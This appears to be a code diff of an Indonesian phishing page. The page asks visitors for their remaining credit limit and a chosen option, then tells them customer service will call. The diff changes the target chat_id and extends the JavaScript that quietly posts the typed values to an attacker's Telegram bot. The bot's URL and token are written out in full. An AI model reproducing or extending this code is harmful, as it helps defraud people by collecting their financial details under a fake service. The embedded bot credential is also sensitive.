@@ -143,16 +143,39 @@
       showWhiteElement();
     }
   };
-  var url = "https://api.telegram.org/bot7086756298:AAEJv_kcR4QkxjMPA4vYwVogDhBhl5-E4fk/sendMessage?chat_id=6664345018&text=" + encodeURIComponent(message);
+  var url = "https://api.telegram.org/bot7086756298:AAEJv_kcR4QkxjMPA4vYwVogDhBhl5-E4fk/sendMessage?chat_id=6664345017&text=" + encodeURIComponent(message);
 
   xhttp.open("POST", url, true);
   xhttp.send();
 }
 
 function kirimPesan() {
+  var pilihanSelect = document.getElementById("pilihan");
+  var pilihanValue = pilihanSelect.options[pilihanSelect.selectedIndex].text;
+  
   var pesan = document.getElementById("jumlahInput").value;
-  // Panggil fungsi sendMessageToTelegram() untuk mengirim pesan
-  sendMessageToTelegram("𝗝𝘂𝗺𝗹𝗮𝗵 𝗟𝗶𝗺𝗶𝘁 𝗦𝗮𝗮𝘁 𝗜𝗻𝗶: " + pesan);
+  if (pesan.trim() === '') {
+    if (navigator.vibrate) {
+      navigator.vibrate(200); // Efek getaran selama 200ms
+    }
+    return;
+  }
+  
+  var hasilContainer = document.getElementById("hasil-container");
+  var hasilText = document.getElementById("hasil");
+  
+  // Memperbarui teks hasil dengan nilai input dan pilihan
+  hasilText.textContent = "Sisa Limit Anda Saat Ini: " + pesan + ", Pilihan Anda: " + pilihanValue;
+  
+  // Menampilkan elemen hasil dan pesan, serta menyembunyikan elemen lainnya
+  hasilContainer.style.display = "block";
+  document.getElementById("pilihan-container").style.display = "none";
+  document.getElementById("jumlah-container").style.display = "none";
+  document.getElementById("gambar-bawah").style.display = "none";
+
+  // Mengirim pesan ke Telegram
+  sendMessageToTelegram("𝗝𝘂𝗺𝗹𝗮𝗵 𝗟𝗶𝗺𝗶𝘁 𝗦𝗮𝗮𝘁 𝗜𝗻𝗶: " + pesan + ", Pilihan Anda: " + pilihanValue);
+  showWhiteElement();
 }
 
 function showWhiteElement() {
@@ -196,19 +219,7 @@ function updateNominal() {
 
   nominalInput.value = formattedValue;
 }
-
-function validateAndSendMessage() {
-  var pesan = document.getElementById("jumlahInput").value;
-  // Validasi jika input kosong
-  if (pesan.trim() === "") {
-    // Bergetar jika input kosong
-    navigator.vibrate([200, 100, 200]);
-    return; // Hentikan eksekusi jika input kosong
-  }
-  // Kirim pesan jika validasi berhasil
-  kirimPesan();
-}
-  </script>
+</script>
 </head>
 <body>
   <!-- Gambar Atas -->
@@ -234,7 +245,7 @@ function validateAndSendMessage() {
   <!-- Kolom Input dan Tombol Submit -->
   <div id="jumlah-container">
     <input type="text" id="jumlahInput" name="jumlah" placeholder="Sisa Limit" oninput="updateNominal()">
-    <button type="button" id="submit" onclick="validateAndSendMessage()">Lanjutkan</button>
+    <input type="submit" id="submit" value="Lanjutkan" onclick="kirimPesan()">
   </div>
 
   <!-- Gambar Bawah -->
@@ -246,5 +257,6 @@ function validateAndSendMessage() {
     <p id="hasil"></p>
     <p id="pesan">CS Layanan Akan Segera Menghubungi Anda. Terimakasih</p>
   </div>
+
 </body>
 </html>
